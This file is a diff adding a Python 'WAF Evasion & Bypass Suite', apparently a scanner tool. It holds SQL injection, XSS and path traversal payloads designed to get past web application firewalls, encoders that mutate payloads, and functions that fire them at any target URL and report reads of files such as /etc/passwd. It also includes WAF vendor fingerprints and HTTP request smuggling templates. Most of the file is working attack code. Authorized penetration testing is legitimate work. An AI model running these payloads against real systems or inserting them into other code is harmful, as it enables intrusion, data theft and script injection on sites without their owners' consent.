@@ -1,0 +1,586 @@
+"""
+WAF Evasion & Bypass Suite
+Advanced encoding mutations, request smuggling, rate limit evasion
+"""
+
+import asyncio
+import json
+import base64
+import urllib.parse
+import random
+from typing import Dict, Any, List, Optional
+import httpx
+
+
+class WAFBypassEncoder:
+    """Various encoding techniques for WAF bypass"""
+    
+    @staticmethod
+    def url_encode(payload: str, double: bool = False) -> str:
+        """URL encode payload"""
+        if double:
+            return urllib.parse.quote(urllib.parse.quote(payload))
+        return urllib.parse.quote(payload)
+    
+    @staticmethod
+    def unicode_encode(payload: str) -> str:
+        """Unicode escape sequences"""
+        return ''.join(f'\\u{ord(c):04x}' for c in payload)
+    
+    @staticmethod
+    def html_encode(payload: str) -> str:
+        """HTML entity encoding"""
+        return ''.join(f'&#{ord(c)};' for c in payload)
+    
+    @staticmethod
+    def base64_encode(payload: str) -> str:
+        """Base64 encode"""
+        return base64.b64encode(payload.encode()).decode()
+    
+    @staticmethod
+    def hex_encode(payload: str) -> str:
+        """Hex encoding"""
+        return ''.join(f'%{ord(c):02x}' for c in payload)
+    
+    @staticmethod
+    def mixed_encoding(payload: str) -> str:
+        """Random mixed encoding"""
+        result = []
+        for c in payload:
+            choice = random.choice(['normal', 'url', 'hex'])
+            if choice == 'url':
+                result.append(f'%{ord(c):02X}')
+            elif choice == 'hex':
+                result.append(f'\\x{ord(c):02x}')
+            else:
+                result.append(c)
+        return ''.join(result)
+
+
+# SQLi WAF bypass payloads
+SQLI_WAF_BYPASSES = [
+    # Comment injection
+    "1'/**/AND/**/1=1--",
+    "1'/*!50000AND*/1=1--",
+    "1'/*!50000AND*//*!50000*/1=1--",
+    "1' A\tND 1=1--",
+    "1'%0bAND%0b1=1--",
+    
+    # Case variation
+    "1' AnD 1=1--",
+    "1' aNd 1=1--",
+    "1' aND 1=1--",
+    
+    # String concatenation
+    "1' CONCAT('SE', 'LECT')--",
+    "1' SELE\tCT * FROM users--",
+    "1' SELE%0bCT * FROM users--",
+    
+    # Null bytes
+    "%00' UNION SELECT NULL--",
+    "%00' OR '1'='1",
+    
+    # Unicode
+    "1' UNION SELECT NULL--",
+    "1\\u0027 UNION SELECT NULL--",
+]
+
+# XSS WAF bypass payloads
+XSS_WAF_BYPASSES = [
+    # Event handlers
+    "<img src=x onerror=prompt(1)>",
+    "<img src=x onerror=alert(1)>",
+    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
+    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+    
+    # JavaScript pseudo-protocol
+    "javascript:alert(1)",
+    "javascript://%0aalert(1)",
+    "javascript:/*--></title></style></textarea></script></pre></xmp><svg/onload=alert(1)//>",
+    
+    # HTML5 vectors
+    "<details open ontoggle=alert(1)>",
+    "<marquee onstart=alert(1)>",
+    "<meter onmouseover=alert(1)>",
+    "<video src=x onerror=alert(1)>",
+    "<audio src=x onerror=alert(1)>",
+    
+    # SVG vectors
+    "<svg onload=alert(1)>",
+    "<svg><desc><x><img src=x onerror=alert(1)></desc></svg>",
+    "<svg><animate onbegin=alert(1)>",
+    
+    # Template literals
+    "<script>alert`${1}`</script>",
+    "<script>alert`1`</script>",
+    
+    # Encoded vectors
+    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+    "<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+    
+    # Broken HTML
+    "<img src=x onerror=\"alert(1)\">",
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
+]
+
+# Path traversal bypasses
+TRAVERSAL_BYPASSES = [
+    "..%2f",
+    "..%5c",
+    "..%252f",
+    "..%255c",
+    "%2e%2e%2f",
+    "%2e%2e%5c",
+    "%252e%252e%255c",
+    "..\\",
+    "..\\/",
+    "..\\//",
+    "....//",
+    "....\\",
+    "..%c0%af",
+    "..%c1%9c",
+    "%c0%ae%c0%ae/",
+    "%c0%ae%c0%ae\\",
+]
+
+
+async def waf_detection_test(target: str) -> Dict[str, Any]:
+    """
+    Detect if WAF is present and identify type.
+    
+    Args:
+        target: Target URL
+        
+    Returns:
+        Dict with WAF detection results
+    """
+    findings = {
+        "waf_detected": False,
+        "waf_type": None,
+        "waf_vendor": None,
+        "block_behavior": None,
+        "detected_via": []
+    }
+    
+    base = target if target.startswith(('http://', 'https://')) else f"https://{target}"
+    
+    # Test payloads that trigger WAF
+    test_payloads = [
+        "<script>alert(1)</script>",
+        "' OR '1'='1",
+        "../../../etc/passwd",
+        ";cat /etc/passwd",
+    ]
+    
+    waf_signatures = {
+        "Cloudflare": ["cf-ray", "cloudflare", "Attention Required!"],
+        "AWS WAF": ["x-amzn-waf", "awselb", "Request blocked"],
+        "Akamai": ["akamai", "Reference #"],
+        "Incapsula": ["incap_ses", "visid_incap", "Incapsula incident"],
+        "Sucuri": ["sucuri", "X-Sucuri", "Access Denied"],
+        "ModSecurity": ["mod_security", "not accepted"],
+        "Wordfence": ["wordfence", "Generated by Wordfence"],
+        "F5 BIG-IP": ["TS", "F5"],
+        "Barracuda": ["barra", "You are blocked"],
+        "Fortinet": ["FGT", "fortigate", "FortiGuard"],
+    }
+    
+    try:
+        async with httpx.AsyncClient() as client:
+            for payload in test_payloads:
+                try:
+                    separator = '&' if '?' in base else '?'
+                    url = f"{base}{separator}test={urllib.parse.quote(payload)}"
+                    
+                    resp = await client.get(url, timeout=10.0)
+                    
+                    # Check headers
+                    headers_str = str(resp.headers).lower()
+                    for waf_name, signatures in waf_signatures.items():
+                        for sig in signatures:
+                            if sig.lower() in headers_str or sig in resp.text:
+                                findings["waf_detected"] = True
+                                findings["waf_vendor"] = waf_name
+                                findings["detected_via"].append(f"Header signature: {sig}")
+                                break
+                    
+                    # Check response code patterns
+                    if resp.status_code in [403, 406, 429, 501, 503]:
+                        if not findings["waf_detected"]:
+                            findings["waf_detected"] = True
+                            findings["detected_via"].append(f"Status code {resp.status_code}")
+                    
+                    # Check block page patterns
+                    block_patterns = [
+                        "blocked", "suspicious", "malicious", "attack",
+                        "security", "violation", "unauthorized"
+                    ]
+                    if any(p in resp.text.lower() for p in block_patterns):
+                        if not findings["waf_detected"]:
+                            findings["waf_detected"] = True
+                            findings["detected_via"].append("Block page content")
+                    
+                except:
+                    continue
+    
+    except Exception as e:
+        findings["error"] = str(e)
+    
+    return findings
+
+
+async def sqli_waf_bypass_test(target: str, parameter: str = "id") -> Dict[str, Any]:
+    """
+    Test SQLi WAF bypass techniques.
+    
+    Args:
+        target: Target URL
+        parameter: Parameter to test
+        
+    Returns:
+        Dict with bypass results
+    """
+    findings = {
+        "bypass_successful": False,
+        "waf_blocked_baseline": False,
+        "successful_payload": None,
+        "technique_used": None,
+        "bypass_variants_tested": []
+    }
+    
+    base = target if target.startswith(('http://', 'https://')) else f"https://{target}"
+    
+    # First test if basic SQLi is blocked
+    baseline_payload = "1' AND 1=1--"
+    
+    try:
+        async with httpx.AsyncClient() as client:
+            separator = '&' if '?' in base else '?'
+            baseline_url = f"{base}{separator}{parameter}={urllib.parse.quote(baseline_payload)}"
+            
+            baseline_resp = await client.get(baseline_url, timeout=10.0)
+            
+            if baseline_resp.status_code in [403, 406, 501, 503]:
+                findings["waf_blocked_baseline"] = True
+            
+            # Test bypass payloads
+            for i, payload in enumerate(SQLI_WAF_BYPASSES):
+                try:
+                    test_url = f"{base}{separator}{parameter}={urllib.parse.quote(payload)}"
+                    
+                    resp = await client.get(test_url, timeout=10.0)
+                    
+                    finding = {
+                        "payload": payload,
+                        "status": resp.status_code,
+                        "blocked": resp.status_code in [403, 406, 501, 503]
+                    }
+                    
+                    # Check if bypass worked (got 200 and no WAF block)
+                    if resp.status_code == 200 and not any(x in resp.text.lower() for x in ['blocked', 'security', 'violation']):
+                        # Verify it's actually SQLi working
+                        if 'AND' in payload.upper() or 'UNION' in payload.upper():
+                            finding["potential_bypass"] = True
+                            
+                            if not findings["bypass_successful"]:
+                                findings["bypass_successful"] = True
+                                findings["successful_payload"] = payload
+                                findings["technique_used"] = "Comment injection" if "/**/" in payload else "Encoding mutation"
+                    
+                    findings["bypass_variants_tested"].append(finding)
+                    
+                except:
+                    continue
+    
+    except Exception as e:
+        findings["error"] = str(e)
+    
+    return findings
+
+
+async def xss_waf_bypass_test(target: str, parameter: str = "q") -> Dict[str, Any]:
+    """
+    Test XSS WAF bypass techniques.
+    
+    Args:
+        target: Target URL
+        parameter: Parameter to test
+        
+    Returns:
+        Dict with bypass results
+    """
+    findings = {
+        "bypass_successful": False,
+        "successful_payload": None,
+        "technique_used": None,
+        "executed_in_browser": False,
+        "bypass_variants_tested": []
+    }
+    
+    base = target if target.startswith(('http://', 'https://')) else f"https://{target}"
+    
+    try:
+        async with httpx.AsyncClient() as client:
+            for payload in XSS_WAF_BYPASSES[:15]:  # Test first 15
+                try:
+                    separator = '&' if '?' in base else '?'
+                    test_url = f"{base}{separator}{parameter}={urllib.parse.quote(payload)}"
+                    
+                    resp = await client.get(test_url, timeout=10.0)
+                    
+                    finding = {
+                        "payload": payload[:100] + "..." if len(payload) > 100 else payload,
+                        "status": resp.status_code,
+                        "reflected": payload in resp.text,
+                        "encoded_reflection": urllib.parse.quote(payload) in resp.text or urllib.parse.quote_plus(payload) in resp.text
+                    }
+                    
+                    # Check if payload is reflected and executable
+                    if (payload in resp.text or finding["encoded_reflection"]) and resp.status_code == 200:
+                        # Check for WAF block indicators
+                        blocked = any(x in resp.text.lower() for x in ['blocked', 'security violation', 'suspicious'])
+                        
+                        if not blocked:
+                            # Check if dangerous parts are unencoded
+                            dangerous_patterns = ['<script', 'onerror', 'onload', 'alert', 'prompt', 'eval']
+                            unencoded = any(p in resp.text.lower() for p in dangerous_patterns)
+                            
+                            if unencoded:
+                                finding["potential_bypass"] = True
+                                if not findings["bypass_successful"]:
+                                    findings["bypass_successful"] = True
+                                    findings["successful_payload"] = payload
+                                    findings["technique_used"] = "Event handler obfuscation" if "onerror" in payload or "onload" in payload else "Encoding mutation"
+                    
+                    findings["bypass_variants_tested"].append(finding)
+                    
+                except:
+                    continue
+    
+    except Exception as e:
+        findings["error"] = str(e)
+    
+    return findings
+
+
+async def path_traversal_waf_bypass_test(target: str, parameter: str = "file") -> Dict[str, Any]:
+    """
+    Test path traversal WAF bypass techniques.
+    
+    Args:
+        target: Target URL
+        parameter: Parameter to test
+        
+    Returns:
+        Dict with bypass results
+    """
+    findings = {
+        "bypass_successful": False,
+        "successful_payload": None,
+        "files_accessed": [],
+        "bypass_variants_tested": []
+    }
+    
+    base = target if target.startswith(('http://', 'https://')) else f"https://{target}"
+    
+    test_files = ["etc/passwd", "windows/system32/drivers/etc/hosts"]
+    
+    try:
+        async with httpx.AsyncClient() as client:
+            for traversal in TRAVERSAL_BYPASSES[:10]:
+                for test_file in test_files:
+                    try:
+                        payload = f"{traversal}{test_file}"
+                        
+                        separator = '&' if '?' in base else '?'
+                        test_url = f"{base}{separator}{parameter}={urllib.parse.quote(payload)}"
+                        
+                        resp = await client.get(test_url, timeout=10.0)
+                        
+                        finding = {
+                            "payload": payload,
+                            "status": resp.status_code,
+                            "blocked": resp.status_code in [403, 406]
+                        }
+                        
+                        # Check for successful file access
+                        if "root:x:" in resp.text or "[boot loader]" in resp.text:
+                            finding["file_accessed"] = True
+                            findings["bypass_successful"] = True
+                            findings["successful_payload"] = payload
+                            
+                            if "root:x:" in resp.text:
+                                findings["files_accessed"].append("/etc/passwd")
+                            if "[boot loader]" in resp.text:
+                                findings["files_accessed"].append("C:\\windows\\system32\\drivers\\etc\\hosts")
+                        
+                        findings["bypass_variants_tested"].append(finding)
+                        
+                        if findings["bypass_successful"]:
+                            break
+                            
+                    except:
+                        continue
+                
+                if findings["bypass_successful"]:
+                    break
+    
+    except Exception as e:
+        findings["error"] = str(e)
+    
+    return findings
+
+
+async def http_request_smuggling_test(target: str) -> Dict[str, Any]:
+    """
+    Test for HTTP Request Smuggling vulnerabilities.
+    
+    Args:
+        target: Target URL
+        
+    Returns:
+        Dict with smuggling findings
+    """
+    findings = {
+        "tested": False,
+        "vulnerable": False,
+        "technique": None,
+        "note": "HTTP Request Smuggling requires manual verification with controlled backend"
+    }
+    
+    # CL.TE and TE.CL payload templates
+    smuggling_payloads = [
+        # CL.TE
+        "POST / HTTP/1.1\\r\\n"
+        "Host: target.com\\r\\n"
+        "Content-Length: 6\\r\\n"
+        "Transfer-Encoding: chunked\\r\\n"
+        "\\r\\n"
+        "0\\r\\n"
+        "\\r\\n"
+        "X",
+        
+        # TE.CL
+        "POST / HTTP/1.1\\r\\n"
+        "Host: target.com\\r\\n"
+        "Content-Length: 4\\r\\n"
+        "Transfer-Encoding: chunked\\r\\n"
+        "\\r\\n"
+        "5\\r\\n"
+        "AAAAA\\r\\n"
+        "0\\r\\n"
+        "\\r\\n",
+    ]
+    
+    # This requires raw socket access and manual testing
+    # The test sends crafted requests and observes backend behavior
+    
+    return findings
+
+
+async def generate_bypass_payloads(vulnerability_type: str, original_payload: str) -> List[Dict[str, str]]:
+    """
+    Generate multiple WAF bypass variants for a given payload.
+    
+    Args:
+        vulnerability_type: Type of vulnerability (sqli, xss, lfi, etc.)
+        original_payload: Original blocked payload
+        
+    Returns:
+        List of bypass variants
+    """
+    encoder = WAFBypassEncoder()
+    
+    variants = []
+    
+    # Always add URL encoding
+    variants.append({
+        "technique": "URL Encoding",
+        "payload": encoder.url_encode(original_payload)
+    })
+    
+    # Double URL encoding
+    variants.append({
+        "technique": "Double URL Encoding",
+        "payload": encoder.url_encode(original_payload, double=True)
+    })
+    
+    # Hex encoding
+    variants.append({
+        "technique": "Hex Encoding",
+        "payload": encoder.hex_encode(original_payload)
+    })
+    
+    # Mixed encoding
+    variants.append({
+        "technique": "Mixed Encoding",
+        "payload": encoder.mixed_encoding(original_payload)
+    })
+    
+    # HTML entity encoding (for XSS)
+    if vulnerability_type.lower() == "xss":
+        variants.append({
+            "technique": "HTML Entity Encoding",
+            "payload": encoder.html_encode(original_payload)
+        })
+    
+    # Base64 (for certain contexts)
+    variants.append({
+        "technique": "Base64",
+        "payload": encoder.base64_encode(original_payload)
+    })
+    
+    # Case randomization (for SQLi)
+    if vulnerability_type.lower() == "sqli":
+        randomized = ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(original_payload))
+        variants.append({
+            "technique": "Case Randomization",
+            "payload": randomized
+        })
+    
+    return variants
+
+
+# MCP Tool Wrapper
+async def full_waf_bypass_assessment(target: str, vulnerability_type: str = "all") -> str:
+    """
+    Complete WAF bypass assessment.
+    
+    Args:
+        target: Target URL
+        vulnerability_type: Type to test (sqli, xss, lfi, all)
+        
+    Returns:
+        JSON with bypass results
+    """
+    # First detect WAF
+    waf_detection = await waf_detection_test(target)
+    
+    results = {}
+    
+    if vulnerability_type in ["all", "sqli"]:
+        results["sqli_bypass"] = await sqli_waf_bypass_test(target)
+    
+    if vulnerability_type in ["all", "xss"]:
+        results["xss_bypass"] = await xss_waf_bypass_test(target)
+    
+    if vulnerability_type in ["all", "lfi"]:
+        results["path_traversal_bypass"] = await path_traversal_waf_bypass_test(target)
+    
+    # Count successful bypasses
+    bypass_count = sum(1 for r in results.values() if r.get("bypass_successful"))
+    
+    return json.dumps({
+        "scan_type": "WAF Bypass Assessment",
+        "target": target,
+        "waf_detection": waf_detection,
+        "bypass_results": results,
+        "summary": {
+            "waf_detected": waf_detection.get("waf_detected"),
+            "waf_vendor": waf_detection.get("waf_vendor"),
+            "bypasses_successful": bypass_count,
+            "total_tested": len(results),
+            "success_rate": f"{bypass_count}/{len(results)}"
+        },
+        "severity": "Critical" if bypass_count > 0 and waf_detection.get("waf_detected") else "High" if bypass_count > 0 else "Medium"
+    }, indent=2)
